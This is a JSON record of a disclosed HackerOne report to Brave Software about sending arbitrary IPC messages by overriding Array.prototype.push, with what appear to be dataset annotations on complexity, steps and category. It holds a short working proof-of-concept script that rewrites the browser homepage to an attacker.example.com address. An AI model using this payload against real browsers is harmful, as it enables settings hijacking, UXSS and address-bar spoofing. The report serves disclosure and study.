{
    "reported_to": "Brave Software",
    "reported_by": "masatokinugawa ",
    "title": "Sending arbitrary IPC messages via overriding Array.prototype.push",
    "content": "\nSummary:\nThis bug is similar to #187542 and #188086.\nI found that also Array.prototype.push is exploitable.\nTested on:\nBrave 0.12.12\nSteps To Reproduce:\nGo to this page: https://vulnerabledoma.in/brave/settings_change3.html\nCode 247 Bytes\n1<script>\n2Array.prototype.push=function(e){\n3\tthis[0]=function(e,f){\n4\t\te.sender.send(\"dispatch-action\",'{\"actionType\":\"app-change-setting\",\"key\":\"general.homepage\",\"value\":\"http://attacker.example.com/\"}');\n5\t}\n6}\n7</script>\n8\n9<embed src=\".swf\"></embed>\nSee about:preferences. You can confirm that your home page is changed to http://attacker.example.com/.\nAlso an attacker can do UXSS and address bar spoofing using this bug. Please see #187542's PoC .\nTechnical Details\nThis push in the event_emitter.js is overwritten:\nCode 197 Bytes\n1EventEmitter2.prototype.on = function (event, fn) {\n2  this._callbacks = this._callbacks || {};\n3  (this._callbacks['$' + event] = this._callbacks['$' + event] || [])\n4    .push(fn);\n5  return this;\n6};\nCould you confirm this bug?\nThanks!\n\n",
    "severity": [
        9.0,
        10.0
    ],
    "bounty": null,
    "weaknesses": [
        "Command Injection - Generic"
    ],
    "screenshots": {},
    "disclosed_date": 1537308900,
    "report_url": "https://hackerone.com/reports/188561",
    "is_multi_component": false,
    "complexity": "LOW",
    "novelty": "LOW",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Navigate to the vulnerable page: https://vulnerabledoma.in/brave/settings_change3.html"
        ],
        [
            2,
            "Execute the provided script to override Array.prototype.push, which triggers the vulnerability when the embed element is loaded"
        ],
        [
            3,
            "Check about:preferences to confirm the homepage has been changed to http://attacker.example.com/"
        ]
    ],
    "vuln_description": "This vulnerability allows an attacker to execute arbitrary IPC messages by overriding the Array.prototype.push method. When the method is overridden, it can be used to send malicious messages that change browser settings, such as the homepage, leading to potential UXSS and address bar spoofing.",
    "reason": "The attack requires understanding and manipulating JavaScript's prototype inheritance and the specific way the Brave browser handles IPC messages. The interaction between the overridden push method and the browser's internal event handling is subtle and non-obvious.",
    "new_complexity": "HIGH",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": "187542",
    "authnz_metadata": {
        "reason": "The vulnerability involves manipulating JavaScript prototypes and IPC messages, which is outside the scope of the described AuthN/AuthZ testing methodology. The methodology focuses on session, action, and resource_id manipulation within HTTP requests, not browser-side JavaScript exploitation or IPC mechanisms.",
        "is_detectable": false
    }
}